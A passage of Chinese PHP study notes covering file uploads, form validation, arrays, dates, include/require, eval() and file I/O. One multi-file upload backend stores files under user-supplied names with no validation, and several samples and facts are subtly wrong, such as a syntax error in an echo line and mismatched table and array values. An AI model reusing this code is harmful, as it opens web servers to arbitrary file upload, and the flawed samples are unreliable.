    [userfile] => Array
    (
        [name] => Screen Shot 2016-05-12 at 18.13.24.png
        [type] => image/png
        [tmp_name] => /private/var/tmp/phplVHp3W
        [error] => 0
        [size] => 344925
    )
)
```

$_FILES数组内容如下:

<input type="file" name="userfile">

```
$_FILES['userfile']['name']
```

客户端机器文件的原名称。



```
$_FILES['userfile']['type']
```

文件的 MIME 类型，需要浏览器提供该信息的支持，例如“image/gif”。



```
$_FILES['userfile']['size']
```

已上传文件的大小，单位为字节。



```
$_FILES['userfile']['tmp_name']
```

文件被上传后在服务端储存的临时文件名。



```
$_FILES['userfile']['error']
```

和该文件上传相关的错误代码。['error'] 是在 PHP 4.2.0 版本中增加的。

注: 在 PHP 4.1.0 版本以前该数组的名称为 $HTTP_POST_FILES，它并不像 $_FILES 一样是自动全局变量。PHP 3 不支持 $HTTP_POST_FILES 数组。

UPLOAD_ERR_OK 
值：0; 没有错误发生，文件上传成功。 
UPLOAD_ERR_INI_SIZE 
值：1; 上传的文件超过了 php.ini 中 upload_max_filesize 选项限制的值。 
UPLOAD_ERR_FORM_SIZE 
值：2; 上传文件的大小超过了 HTML 表单中 MAX_FILE_SIZE 选项指定的值。 
UPLOAD_ERR_PARTIAL 
值：3; 文件只有部分被上传。 
UPLOAD_ERR_NO_FILE 
值：4; 没有文件被上传。 
值：5; 上传文件大小为0. 

文件被上传结束后，默认地被存储在了临时目录中，这时您必须将它从临时目录中删除或移动到其它地方，如果没有，则会被删除。也就是不管是否上传成功，脚本执行完后临时目录里的文件肯定会被删除。所以在删除之前要用PHP的 copy() 函数将它复制到其它位置，此时，才算完成了上传文件过程。

 

move_uploaded_file -- 将上传的文件移动到新位置

说明
bool move_uploaded_file ( string filename, string destination )


本函数检查并确保由 filename 指定的文件是合法的上传文件（即通过 PHP 的 HTTP POST 上传机制所上传的）。如果文件合法，则将其移动为由 destination 指定的文件。

如果 filename 不是合法的上传文件，不会出现任何操作，move_uploaded_file() 将返回 FALSE。

如果 filename 是合法的上传文件，但出于某些原因无法移动，不会出现任何操作，move_uploaded_file() 将返回 FALSE。此外还会发出一条警告。

这种检查显得格外重要，如果上传的文件有可能会造成对用户或本系统的其他用户显示其内容的话

```php
前端
<html>
<head><title>upload picture more once</title></head>
<body>
<form action="" method="post" enctype="multipart/form-data">
<p>Pictures:<br />
<input type="file" name="pictures[]" /><br />
<input type="file" name="pictures[]" /><br />
<input type="file" name="pictures[]" /><br />
<input type="submit" name="upload" value="Send" />
</p>
</form>
</body>
</html>
后端
<?php
error_reporting(0);
if($_POST['upload']=='Send'){
$dest_folder = "picture/";
if(!file_exists($dest_folder)){
mkdir($dest_folder);
}
foreach ($_FILES["pictures"]["error"] as $key => $error) {
if ($error == UPLOAD_ERR_OK) {
$tmp_name = $_FILES["pictures"]["tmp_name"][$key];
$name = $_FILES["pictures"]["name"][$key];
$uploadfile = $dest_folder.$name;
move_uploaded_file($tmp_name, $uploadfile);
}
}
}
?>
```



## PHP表单验证-必填字段

**本节展示如何制作必填输入字段，并创建需要时所用的错误消息。**

## PHP - 输入字段

从上一节中的验证规则中，我们看到 "Name", "E-mail" 以及 "Gender" 字段是必需的。这些字段不能为空且必须在 HTML 表单中填写。

| 字段    | 验证规则                                          |
| :------ | :------------------------------------------------ |
| Name    | 必需。必须包含字母和空格。                        |
| E-mail  | 必需。必须包含有效的电子邮件地址（包含 @ 和 .）。 |
| Website | 可选。如果选填，则必须包含有效的 URL。            |
| Comment | 可选。多行输入字段（文本框）。                    |
| Gender  | 必需。必须选择一项。                              |

在上一节中，所有输入字段都是可选的。

在下面的代码中我们增加了一些新变量：$nameErr、$emailErr、$genderErr 以及 $websiteErr。这些错误变量会保存被请求字段的错误消息。我们还为每个 $_POST 变量添加了一个 if else 语句。这条语句检查 $_POST 变量是否为空（通过 PHP empty() 函数）。如果为空，则错误消息会存储于不同的错误变量中。如果不为空，则通过 test_input() 函数发送用户输入数据：

```php
<?php
// 定义变量并设置为空值
$nameErr = $emailErr = $genderErr = $websiteErr = "";
$name = $email = $gender = $comment = $website = "";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
  if (empty($_POST["name"])) {
    $nameErr = "Name is required";
  } else {
    $name = test_input($_POST["name"]);
  }

  if (empty($_POST["email"])) {
    $emailErr = "Email is required";
  } else {
    $email = test_input($_POST["email"]);
  }

  if (empty($_POST["website"])) {
    $website = "";
  } else {
    $website = test_input($_POST["website"]);
  }

  if (empty($_POST["comment"])) {
    $comment = "";
  } else {
    $comment = test_input($_POST["comment"]);
  }

  if (empty($_POST["gender"])) {
    $genderErr = "Gender is required";
  } else {
    $gender = test_input($_POST["gender"]);
  }
}
?>
```

### PHP - 显示错误消息

在 HTML 表单中，我们在每个被请求字段后面增加了一点脚本。如果需要，会生成恰当的错误消息（如果用户未填写必填字段就试图提交表单）：

### 实例

```php
<form method="post" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]);?>">

Name: <input type="text" name="name">
<span class="error">* <?php echo $nameErr;?></span>
<br><br>
E-mail:
<input type="text" name="email">
<span class="error">* <?php echo $emailErr;?></span>
<br><br>
Website:
<input type="text" name="website">
<span class="error"><?php echo $websiteErr;?></span>
<br><br>
<label>Comment: <textarea name="comment" rows="5" cols="40"></textarea>
<br><br>
Gender:
<input type="radio" name="gender" value="female">Female
<input type="radio" name="gender" value="male">Male
<span class="error">* <?php echo $genderErr;?></span>
<br><br>
<input type="submit" name="submit" value="Submit"> 

</form>
```

接下来是验证输入数据，即“Name 字段是否只包含字母和空格？”，以及“E-mail 字段是否包含有效的电子邮件地址语法？”，并且如果填写了 Website 字段，“这个字段是否包含了有效的 URL？”。

## PHP 表单验证 - 验证 E-mail 和 URL

**本节展示如何验证名字、电邮和 URL。**

### PHP - 验证名字

以下代码展示的简单方法检查 name 字段是否包含字母和空格。如果 name 字段无效，则存储一条错误消息：

```
$name = test_input($_POST["name"]);
if (!preg_match("/^[a-zA-Z ]*$/",$name)) { # ^表示开始字符   $表示结束字符 
  $nameErr = "只允许字母和空格！"; 
}
```

**注释：**preg_match() 函数检索字符串的模式，如果模式存在则返回 true，否则返回 false。

### PHP - 验证 E-mail

以下代码展示的简单方法检查 e-mail 地址语法是否有效。如果无效则存储一条错误消息：

```
$email = test_input($_POST["email"]);
if (!preg_match("/([\w\-]+\@[\w\-]+\.[\w\-]+)/",$email)) {
  $emailErr = "无效的 email 格式！"; 
}
```

### PHP - 验证 URL

以下代码展示的方法检查 URL 地址语法是否有效（这条正则表达式同时允许 URL 中的斜杠）。如果 URL 地址语法无效，则存储一条错误消息：

```
$website = test_input($_POST["website"]);
if (!preg_match("/\b(?:(?:https?|ftp):\/\/|www\.)[-a-z0-9+&@#\/%?=~_|!:,.;]*[-a-z0-9+&@#\/%=~_|]/i",$website)) {
  $websiteErr = "无效的 URL"; 
}
```

### PHP - 验证 Name、E-mail、以及 URL

现在，脚本是这样的：

```php
<?php
// 定义变量并设置为空值
$nameErr = $emailErr = $genderErr = $websiteErr = "";
$name = $email = $gender = $comment = $website = "";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
  if (empty($_POST["name"])) {
    $nameErr = "Name is required";
  } else {
    $name = test_input($_POST["name"]);
    // 检查名字是否包含字母和空格
    if (!preg_match("/^[a-zA-Z ]*$/",$name)) {
      $nameErr = "Only letters and white space allowed"; 
    }
  }

  if (empty($_POST["email"])) {
    $emailErr = "Email is required";
  } else {
    $email = test_input($_POST["email"]);
    // 检查电邮地址语法是否有效
    if (!preg_match("/([\w\-]+\@[\w\-]+\.[\w\-]+)/",$email)) {
      $emailErr = "Invalid email format"; 
    }
  }

  if (empty($_POST["website"])) {
    $website = "";
  } else {
    $website = test_input($_POST["website"]);
    // 检查 URL 地址语言是否有效（此正则表达式同样允许 URL 中的下划线）
    if (!preg_match("/\b(?:(?:https?|ftp):\/\/|www\.)[-a-z0-9+&@#\/%?=~_|!:,.;]*[-a-z0-9+&@#\/%=~_|]/i",$website)) {
      $websiteErr = "Invalid URL"; 
    }
  }

  if (empty($_POST["comment"])) {
    $comment = "";
  } else {
    $comment = test_input($_POST["comment"]);
  }

  if (empty($_POST["gender"])) {
    $genderErr = "Gender is required";
  } else {
    $gender = test_input($_POST["gender"]);
  }
}
?>
```

![image-20220824103038477](http://cdn.ayusummer233.top/img/image-20220824103038477.png)

接下来向您讲解如何防止表单在用户提交表单后清空所有输入字段。

### PHP 表单验证 - 完成表单实例

**本节展示如何在用户提交表单后保留输入字段中的值。**

### PHP - 保留表单中的值

如需在用户点击提交按钮后在输入字段中显示值，我们在以下输入字段的 value 属性中增加了一小段 PHP 脚本：name、email 以及 website。在 comment 文本框字段中，我们把脚本放到了 <textarea> 与 </textarea> 之间。这些脚本输出 $name、$email、$website 和 $comment 变量的值。

然后，我们还需要显示选中了哪个单选按钮。对此，我们必须操作 checked 属性（而非单选按钮的 value 属性）：

```php
Name: <input type="text" name="name" value="<?php echo $name;?>">

E-mail: <input type="text" name="email" value="<?php echo $email;?>">

Website: <input type="text" name="website" value="<?php echo $website;?>">

Comment: <textarea name="comment" rows="5" cols="40"><?php echo $comment;?></textarea>

Gender:

<input type="radio" name="gender"
<?php if (isset($gender) && $gender=="female") echo "checked";?>
value="female">Female
<input type="radio" name="gender"
<?php if (isset($gender) && $gender=="male") echo "checked";?>
value="male">Male
```

## PHP高级教程

在本教程之前的章节中，我们已经知道数组是一种数/值对的简单列表。

不过，有时您希望用一个以上的键存储值。

可以用多维数组进行存储。

### PHP - 多维数组

多维数组指的是包含一个或多个数组的数组。

PHP 能理解两、三、四或五级甚至更多级的多维数组。不过，超过三级深的数组对于大多数人难于管理。

**注释：**数组的维度指示您需要选择元素的索引数。

- 对于二维数组，您需要两个索引来选取元素
- 对于三维数组，您需要三个索引来选取元素

#### PHP - 两维数组

两维数组是数组的数组（三维数组是数组的数组的数组）。

首先，让我们看看下面的表格：

| 品牌       | 库存 | 销量 |
| :--------- | :--- | :--- |
| Volvo      | 33   | 20   |
| BMW        | 17   | 15   |
| Saab       | 5    | 2    |
| Land Rover | 15   | 11   |

我们能够在两维数组中存储上表中的数据，就像这样：

```
$cars = array
  (
  array("Volvo",22,18),
  array("BMW",15,13),
  array("Saab",5,2),
  array("Land Rover",17,15)
  );
```

现在这个两维数组包含了四个数组，并且它有两个索引（下标）：行和列。

如需访问 $cars 数组中的元素，我们必须使用两个索引（行和列）：

```php
<?php
echo $cars[0][0].": 库存：".$cars[0][1].", 销量：".$cars[0][2].".<br>";
echo $cars[1][0].": 库存：".$cars[1][1].", 销量：".$cars[1][2].".<br>";
echo $cars[2][0].": 库存：".$cars[2][1].", 销量：".$cars[2][2].".<br>";
echo $cars[3][0].": 库存：".$cars[3][1].", 销量：".$cars[3][2].".<br>";
?>
```

我们也可以在 For 循环中使用另一个 For 循环，来获得 $cars 数组中的元素（我们仍需使用两个索引）：

```php
<?php
for ($row = 0; $row < 4; $row++) {
  echo "<p><b>Row number $row</b></p>";
  echo "<ul>";
  for ($col = 0; $col < 3; $col++) {
    echo "<li>".$cars[$row][$col]."</li>";
  }
  echo "</ul>";
}
?>
```

## PHP 日期和时间

**PHP date() 函数用于对日期或时间进行格式化。**

### PHP Date() 函数

PHP Date() 函数把时间戳格式化为更易读的日期和时间。

```
date(format,timestamp)
```

| 参数      | 描述                                     |
| :-------- | :--------------------------------------- |
| format    | 必需。规定时间戳的格式。                 |
| timestamp | 可选。规定时间戳。默认是当前时间和日期。 |

**注释：**时间戳是一种字符序列，它表示具体事件发生的日期和事件。

### 获得简单的日期

date() 函数的格式参数是必需的，它们规定如何格式化日期或时间。

下面列出了一些常用于日期的字符：

- d - 表示月里的某天（01-31）
- m - 表示月（01-12）
- Y - 表示年（四位数）
- 1 - 表示周里的某天

其他字符，比如 "/", "." 或 "-" 也可被插入字符中，以增加其他格式。

下面的例子用三种不同方法格式今天的日期：

```php
<?php
echo "今天是 " . date("Y/m/d") . "<br>";
echo "今天是 " . date("Y.m.d") . "<br>";
echo "今天是 " . date("Y-m-d") . "<br>";
echo "今天是 " . date("l");
?>
```

![image-20220825093533388](http://cdn.ayusummer233.top/img/image-20220825093533388.png)

### PHP 提示 - 自动版权年份

使用 date() 函数在您的网站上自动更新版本年份：

![image-20220825093610110](http://cdn.ayusummer233.top/img/image-20220825093610110.png)

### 获得简单的时间

下面是常用于时间的字符：

- h - 带有首位零的 12 小时小时格式
- i - 带有首位零的分钟
- s - 带有首位零的秒（00 -59）
- a - 小写的午前和午后（am 或 pm）

下面的例子以指定的格式输出当前时间：

```php
<?php
echo "现在时间是 " . date("h:i:sa");
?>
```

![image-20220825093712780](http://cdn.ayusummer233.top/img/image-20220825093712780.png)

**注释：**请注意 PHP date() 函数会返回服务器的当前日期/时间！

### 获得时区

如果从代码返回的不是正确的时间，有可能是因为您的服务器位于其他国家或者被设置为不同时区。

因此，如果您需要基于具体位置的准确时间，您可以设置要用的时区。

下面的例子把时区设置为 "Asia/Shanghai"，然后以指定格式输出当前时间：

```php
<?php
date_default_timezone_set("Asia/Shanghai");
echo "当前时间是 " . date("h:i:sa");
?>
```

### 通过 PHP mktime() 创建日期

date() 函数中可选的时间戳参数规定时间戳。如果您未规定时间戳，将使用当前日期和时间（正如上例中那样）。

mktime() 函数返回日期的 Unix 时间戳。Unix 时间戳包含 Unix 纪元（1970 年 1 月 1 日 00:00:00 GMT）与指定时间之间的秒数。

```
mktime(hour,minute,second,month,day,year)
```

下面的例子使用 mktime() 函数中的一系列参数来创建日期和时间：

```php
<?php
$d=mktime(9, 12, 31, 6, 10, 2015);
echo "创建日期是 " . date("Y-m-d h:i:sa", $d);
?>
```

![image-20220825094003054](http://cdn.ayusummer233.top/img/image-20220825094003054.png)

### 通过 PHP strtotime() 用字符串来创建日期

PHP strtotime() 函数用于把人类可读的字符串转换为 Unix 时间。

```
strtotime(time,now)
```

下面的例子通过 strtotime() 函数创建日期和时间：

```php
<?php
$d=strtotime("10:38pm April 15 2015");
echo "创建日期是 " . date("Y-m-d h:i:sa", $d);
?>
```

![image-20220825094125752](http://cdn.ayusummer233.top/img/image-20220825094125752.png)

PHP 在将字符串转换为日期这方面非常聪明，所以您能够使用各种值：

```php
<?php
$d=strtotime("tomorrow");
echo date("Y-m-d h:i:sa", $d) . "<br>";

$d=strtotime("next Saturday");
echo date("Y-m-d h:i:sa", $d) . "<br>";

$d=strtotime("+3 Months");
echo date("Y-m-d h:i:sa", $d) . "<br>";
?>
```

不过，strtotime() 并不完美，所以请记得检查放入其中的字符串。

### 更多日期实例

下例输出下周六的日期：

```php
<?php
$startdate = strtotime("Saturday");
$enddate = strtotime("+6 weeks",$startdate);

while ($startdate < $enddate) {
  echo date("M d", $startdate),"<br>";
  $startdate = strtotime("+1 week", $startdate);
}
?>
```

![image-20220825094410018](http://cdn.ayusummer233.top/img/image-20220825094410018.png)

下例输出七月四日之前的天数：

```php
<?php
$d1=strtotime("December 31");
$d2=ceil(($d1-time())/60/60/24);  返回的时间戳单位是s   /60 分钟  /60 小时  /24 天
echo "距离十二月三十一日还有：" . $d2 ." 天。";
?>
```

![image-20220825094517008](http://cdn.ayusummer233.top/img/image-20220825094517008.png)

### 完整的 PHP 日期参考手册

如需所有日期函数的完整手册，请访问我们的 [PHP 日期参考手册](https://www.w3school.com.cn/php/php_ref_date.asp)。

该手册包含每个函数的简要描述以及使用示例。

## PHP Include 文件

**服务器端包含 (SSI) 用于创建可在多个页面重复使用的函数、页眉、页脚或元素。**

include （或 require）语句会获取指定文件中存在的所有文本/代码/标记，并复制到使用 include 语句的文件中。

包含文件很有用，如果您需要在网站的多张页面上引用相同的 PHP、HTML 或文本的话。

### PHP include和require语句

通过 include 或 require 语句，可以将 PHP 文件的内容插入另一个 PHP 文件（在服务器执行它之前）。

include 和 require 语句是相同的，除了错误处理方面：

- require 会生成致命错误（E_COMPILE_ERROR）并停止脚本
- include 只生成警告（E_WARNING），并且脚本会继续

因此，如果您希望继续执行，并向用户输出结果，即使包含文件已丢失，那么请使用 include。否则，在框架、CMS 或者复杂的 PHP 应用程序编程中，请始终使用 require 向执行流引用关键文件。这有助于提高应用程序的安全性和完整性，在某个关键文件意外丢失的情况下。

包含文件省去了大量的工作。这意味着您可以为所有页面创建标准页头、页脚或者菜单文件。然后，在页头需要更新时，您只需更新这个页头包含文件即可。

```
include 'filename';
```

或

```
require 'filename';
```

### inlude实例

假设我们有一个名为 "footer.php" 的标准的页脚文件，就像这样：

```
<?php
echo "<p>Copyright © 2006-" . date("Y") . " W3School.com.cn</p>";
?>
```

如需在一张页面中引用这个页脚文件，请使用 include 语句：

```php
<html>
<body>

<h1>欢迎访问我们的首页！</h1>
<p>一段文本。</p>
<p>一段文本。</p>
<?php include 'footer.php';?>

</body>
</html>
```

![image-20220826090203104](http://cdn.ayusummer233.top/img/image-20220826090203104.png)

例子2

假设我们有一个名为 "menu.php" 的标准菜单文件：

```php
<?php
echo '<a href="/index.asp">首页</a> -
<a href="/html/index.asp">HTML 教程</a> -
<a href="/css/index.asp">CSS 教程</a> -
<a href="/js/index.asp">JavaScript 教程</a> -
<a href="/php/index.asp">PHP 教程</a>';
?>
```

网站中的所有页面均使用此菜单文件。具体的做法是（我们使用了一个 <div> 元素，这样今后就可以轻松地通过 CSS 设置样式）：

```php
<html>
<body>

<div class="menu">
<?php include 'menu.php';?>
</div>

<h1>欢迎访问我的首页！</h1>
<p>Some text.</p>
<p>Some more text.</p>

</body>
</html>
```

![image-20220905183117607](http://cdn.ayusummer233.top/img/image-20220905183117607.png)

例子3

假设我们有一个名为 "vars.php" 的文件，其中定义了一些变量：

```PHP
<?php
$color='银色的';
$car='奔驰轿车';
?>
```

然后，如果我们引用这个 "vars.php" 文件，就可以在调用文件中使用这些变量：

```php
<html>
<body>

<h1>欢迎访问我的首页！</h1>
<?php
include 'vars.php';
echo "我有一辆" . $color . $car "。";
?>

</body>
</html>
```

![image-20220826090722576](http://cdn.ayusummer233.top/img/image-20220826090722576.png)

### PHP include VS require

require 语句同样用于向 PHP 代码中引用文件。

不过，include 与 require 有一个巨大的差异：如果用 include 语句引用某个文件并且 PHP 无法找到它，脚本会继续执行：

```php
<html>
<body>

<h1>Welcome to my home page!</h1>
<?php
include 'noFileExists.php';
echo "I have a $color $car.";
?>

</body>
</html>
```

使用 require 语句完成相同的案例，echo 语句不会继续执行，因为在 require 语句返回严重错误之后脚本就会终止执行：

![image-20220826091019301](http://cdn.ayusummer233.top/img/image-20220826091019301.png)

注释：

请在此时使用 require：当文件被应用程序请求时。

请在此时使用 include：当文件不是必需的，且应用程序在文件未找到时应该继续运行时。

## PHP 特殊操作和变量

### PHP_EOL

PHP 中换行可以用 PHP_EOL 来替代，以提高代码的源代码级可移植性：

- unix系列用 \n
- windows系列用 \r\n
- mac用 \r

### PHP eval()

[PHP Misc 参考手册](https://www.runoob.com/php/php-ref-misc.html)

把字符串当成 PHP 代码来计算：   叫代码执行器

```php
<?php
$string = "beautiful";
$time = "winter";
 
$str = 'This is a $string $time morning!';
echo $str.PHP_EOL;  #    .  拼接作用

eval("\$str = \"$str\";"); # eval里放需要执行的命令，命令里的特殊字符需要转义才可以(如果使用双引号)  (使用单引号则不用转义  单引号里的所有特殊字符都失效) 需要执行的语句最后要加;   执行eval时里面是  $str = "'This is a $string $time morning!'"; 因为
$str = "'This is a $string $time morning!'"; #""让里面的''对特殊字符的屏蔽失效   真实eval执行的语句
#所以执行的语句里的$string和$time也会是各自变量的值

echo $str;
?>
```

```
函数功能
eval() 函数可将字符串转换为代码执行，并返回一个或多个值
函数原型
返回值 = eval( codeString )
函数说明
如果eval函数在执行时遇到错误,则抛出异常给调用者.
类似的函数是loadcode ,loadcode并不立即执行代码,而是返回一个函数对象.
并且loadcode支持路径参数,eval并不支持. eval并不支持代码中的return语句,而是将代码作为表达式直接计算出结果.

#例子：
var d = eval("({name:'chentong'})")
alert(d.name);

```

以上代码执行输出结果为:

This is a $string $time morning!
This is a beautiful winter morning!

#### 定义和用法

eval() 函数把字符串按照 PHP 代码来计算。

该字符串必须是合法的 PHP 代码，且必须以分号结尾。

**注释：**return 语句会立即终止对字符串的计算。

**提示：**该函数对于在数据库文本字段中供日后计算而进行的代码存储很有用。

```
eval(phpcode)
```

| 参数      | 描述                          |
| :-------- | :---------------------------- |
| *phpcode* | 必需。规定要计算的 PHP 代码。 |

| 返回值：   | 除非在代码字符串中调用 return 语句，则返回传给 return 语句的值，否则返回 NULL。如果代码字符串中存在解析错误，则 eval() 函数返回 FALSE。 |
| :--------- | ------------------------------------------------------------ |
| PHP 版本： | 4+                                                           |

### @

@在PHP中用作错误控制操作符。当表达式附加@符号时，将忽略该表达式可能生成的错误消息。如果启用了track_errors功能，则表达式生成的错误消息将保存在变量$ php_errormsg中。每个错误都会覆盖此变量。

## PHP文件处理

### PHP 操作文件

PHP 拥有的多种函数可供创建、读取、上传以及编辑文件。

**注意：**请谨慎操作文件！

当您操作文件时必须非常小心。如果您操作失误，可能会造成非常严重的破坏。常见的错误是：

- 编辑错误的文件
- 被垃圾数据填满硬盘
- 意外删除文件内容

###  PHP readfile()

readfile() 函数读取文件，并把它写入输出缓冲。

假设我们有一个名为 "webdictionary.txt" 的文本文件，存放在服务器上，就像这样：

```
AJAX = Asynchronous JavaScript and XML
CSS = Cascading Style Sheets
HTML = Hyper Text Markup Language
PHP = PHP Hypertext Preprocessor
SQL = Structured Query Language
SVG = Scalable Vector Graphics
XML = EXtensible Markup Language
```

读取此文件并写到输出流的 PHP 代码如下（如读取成功则 readfile() 函数返回字节数）：

```php
<?php
echo readfile("webdictionary.txt");
?>
```

![image-20220829092331275](http://cdn.ayusummer233.top/img/image-20220829092331275.png)

如果您想做的所有事情就是打开一个文件并读取器内容，那么 readfile() 函数很有用。

### PHP Filesystem 参考手册

如需完整的 PHP 文件系统参考手册，请访问 W3School 提供的 [PHP Filesystem 参考手册](https://www.w3school.com.cn/php/php_ref_filesystem.asp)。

## PHP文件打开/读取/关闭

**如何在服务器上打开、读取以及关闭文件。**

### PHP Open File - fopen()

打开文件的更好的方法是通过 fopen() 函数。此函数为您提供比 readfile() 函数更多的选项。

在课程中，我们将使用文本文件 "webdictionary.txt"：

```
AJAX = Asynchronous JavaScript and XML
CSS = Cascading Style Sheets
HTML = Hyper Text Markup Language
PHP = PHP Hypertext Preprocessor
SQL = Structured Query Language
SVG = Scalable Vector Graphics
XML = EXtensible Markup Language
```

fopen() 的第一个参数包含被打开的文件名，第二个参数规定打开文件的模式。如果 fopen() 函数未能打开指定的文件，下面的例子会生成一段消息：

```php
<?php
$myfile = fopen("webdictionary.txt", "r") or die("Unable to open file!");
echo fread($myfile,filesize("webdictionary.txt"));
fclose($myfile);
?>
```

![image-20220829092551693](http://cdn.ayusummer233.top/img/image-20220829092551693.png)

**提示：**我们接下来将学习 fread() 以及 fclose() 函数。

文件会以如下模式之一打开：

| 模式 | 描述                                                         |
| :--- | :----------------------------------------------------------- |
| r    | 打开文件为只读。文件指针在文件的开头开始。                   |
| w    | 打开文件为只写。删除文件的内容或创建一个新的文件，如果它不存在。文件指针在文件的开头开始。 |
| a    | 打开文件为只写。文件中的现有数据会被保留。文件指针在文件结尾开始。创建新的文件，如果文件不存在。 |
| x    | 创建新文件为只写。返回 FALSE 和错误，如果文件已存在。        |
| r+   | 打开文件为读/写、文件指针在文件开头开始。                    |
| w+   | 打开文件为读/写。删除文件内容或创建新文件，如果它不存在。文件指针在文件开头开始。 |
| a+   | 打开文件为读/写。文件中已有的数据会被保留。文件指针在文件结尾开始。创建新文件，如果它不存在。 |
| x+   | 创建新文件为读/写。返回 FALSE 和错误，如果文件已存在。       |

### PHP 读取文件 - fread()

fread() 函数读取打开的文件。

fread() 的第一个参数包含待读取文件的文件名，第二个参数规定待读取的最大字节数。

如下 PHP 代码把 "webdictionary.txt" 文件读至结尾：

```
fread($myfile,filesize("webdictionary.txt"));
```

### PHP 关闭文件 - fclose()

fclose() 函数用于关闭打开的文件。

**注释：**用完文件后把它们全部关闭是一个良好的编程习惯。您并不想打开的文件占用您的服务器资源。

fclose() 需要待关闭文件的名称（或者存有文件名的变量）：

```php
<?php
$myfile = fopen("webdictionary.txt", "r");
// some code to be executed....
fclose($myfile);
?>
```

### PHP 读取单行文件 - fgets()

fgets() 函数用于从文件读取单行。

下例输出 "webdictionary.txt" 文件的首行：

```php
<?php
$myfile = fopen("webdictionary.txt", "r") or die("Unable to open file!");
echo fgets($myfile);
fclose($myfile);
?>
```

![image-20220829102816027](http://cdn.ayusummer233.top/img/image-20220829102816027.png)

**注释：**调用 fgets() 函数之后，文件指针会移动到下一行。

### PHP 检查 End-Of-File - feof()

feof() 函数检查是否已到达 "end-of-file" (EOF)。不是返回false   是返回true

feof() 对于遍历未知长度的数据很有用。

下例逐行读取 "webdictionary.txt" 文件，直到 end-of-file：

```
<?php
$myfile = fopen("webdictionary.txt", "r") or die("Unable to open file!");
// 输出单行直到 end-of-file
while(!feof($myfile)) {
  echo fgets($myfile) . "<br>";
}
fclose($myfile);
?>
```

![image-20220829102833631](http://cdn.ayusummer233.top/img/image-20220829102833631.png)

### PHP 读取单字符 - fgetc()

fgetc() 函数用于从文件中读取单个字符。

下例逐字符读取 "webdictionary.txt" 文件，直到 end-of-file：

```php
<?php
$myfile = fopen("webdictionary.txt", "r") or die("Unable to open file!");
// 输出单字符直到 end-of-file
while(!feof($myfile)) {
  echo fgetc($myfile);
}
fclose($myfile);
?>
```

![image-20220829102849429](http://cdn.ayusummer233.top/img/image-20220829102849429.png)

**注释：**在调用 fgetc() 函数之后，文件指针会移动到下一个字符。

## PHP文件的创建/写入

**在服务器上创建并写入文件。**

### PHP 创建文件 - fopen()

fopen() 函数也用于创建文件。也许有点混乱，但是在 PHP 中，创建文件所用的函数与打开文件的相同。

如果您用 fopen() 打开并不存在的文件，此函数会创建文件，假定文件被打开为写入（w）或增加（a）。

下面的例子创建名为 "testfile.txt" 的新文件。此文件将被创建于 PHP 代码所在的相同目录中：

```
$myfile = fopen("testfile.txt", "w")
```

$myfile成为输出缓冲区

### PHP 文件权限

如果您试图运行这段代码时发生错误，请检查您是否有向硬盘写入信息的 PHP 文件访问权限。

### PHP 写入文件 - fwrite()

fwrite() 函数用于写入文件。

fwrite() 的第一个参数包含要写入的文件的文件名，第二个参数是被写的字符串。

下面的例子把姓名写入名为 "newfile.txt" 的新文件中：

```php
<?php
$myfile = fopen("newfile.txt", "w") or die("Unable to open file!"); //or die 用于处理异常
$txt = "Bill Gates\n";
fwrite($myfile, $txt);
$txt = "Steve Jobs\n";
fwrite($myfile, $txt);
fclose($myfile);
?>
```

请注意，我们向文件 "newfile.txt" 写了两次。在每次我们向文件写入时，在我们发送的字符串 $txt 中，第一次包含 "Bill Gates"，第二次包含 "Steve Jobs"。在写入完成后，我们使用 fclose() 函数来关闭文件。

如果我们打开 "newfile.txt" 文件，它应该是这样的：

```
Bill Gates
Steve Jobs
```

### PHP 覆盖（Overwriting）

如果现在 "newfile.txt" 包含了一些数据，我们可以展示在写入已有文件时发生的的事情。所有已存在的数据会被擦除并以一个新文件开始。

在下面的例子中，我们打开一个已存在的文件 "newfile.txt"，并向其中写入了一些新数据：

```php
<?php
$myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
$txt = "Mickey Mouse\n";
fwrite($myfile, $txt);
$txt = "Minnie Mouse\n";
fwrite($myfile, $txt);
fclose($myfile);
?>
```

如果现在我们打开这个 "newfile.txt" 文件，Bill 和 Steve 都已消失，只剩下我们刚写入的数据：

```
Mickey Mouse
Minnie Mouse
```

### PHP Filesystem 参考手册

如需完整的 PHP 文件系统参考手册，请访问 W3School 提供的 [PHP Filesystem 参考手册](https://www.w3school.com.cn/php/php_ref_filesystem.asp)。

## PHP文件上传

**通过 PHP，可以把文件上传到服务器。**

### 创建一个文件上传表单

允许用户从表单上传文件是非常有用的。

请看下面这个供上传文件的 HTML 表单：

```php
<html>
<body>

<form action="upload_file.php" method="post"
enctype="multipart/form-data">
<label for="file">Filename:</label>
<input type="file" name="file" id="file" /> 
<br />
<input type="submit" name="submit" value="Submit" />
</form>

</body>
</html>
```

请留意如下有关此表单的信息：

`<form>` 标签的 enctype 属性规定了在提交表单时要使用哪种内容类型。在表单需要二进制数据时，比如文件内容，请使用 "multipart/form-data"。

`<input>` 标签的 type="file" 属性规定了应该把输入作为文件来处理。举例来说，当在浏览器中预览时，会看到输入框旁边有一个浏览按钮。

**注释：**允许用户上传文件是一个巨大的安全风险。请仅仅允许可信的用户执行文件上传操作。

### 创建上传脚本

"upload_file.php" 文件含有供上传文件的代码：

```php
<?php
if ($_FILES["file"]["error"] > 0)
  {
  echo "Error: " . $_FILES["file"]["error"] . "<br />";
  }
else
  {
  echo "Upload: " . $_FILES["file"]["name"] . "<br />";
  echo "Type: " . $_FILES["file"]["type"] . "<br />";
  echo "Size: " . ($_FILES["file"]["size"] / 1024) . " Kb<br />";
  echo "Stored in: " . $_FILES["file"]["tmp_name"];
  }
?>
```

通过使用 PHP 的全局数组 $_FILES，你可以从客户计算机向远程服务器上传文件。

第一个参数是表单的 input name，第二个下标可以是 "name", "type", "size", "tmp_name" 或 "error"。就像这样：

- $_FILES["file"]["name"] - 被上传文件的名称
- $_FILES["file"]["type"] - 被上传文件的类型
- $_FILES["file"]["size"] - 被上传文件的大小，以字节计
- $_FILES["file"]["tmp_name"] - 存储在服务器的文件的临时副本的名称
- $_FILES["file"]["error"] - 由文件上传导致的错误代码

这是一种非常简单文件上传方式。基于安全方面的考虑，您应当增加有关什么用户有权上传文件的限制。

## 上传限制

在这个脚本中，我们增加了对文件上传的限制。用户只能上传 .gif 或 .jpeg 文件，文件大小必须小于 20 kb：

```php
<?php

if ((($_FILES["file"]["type"] == "image/gif")
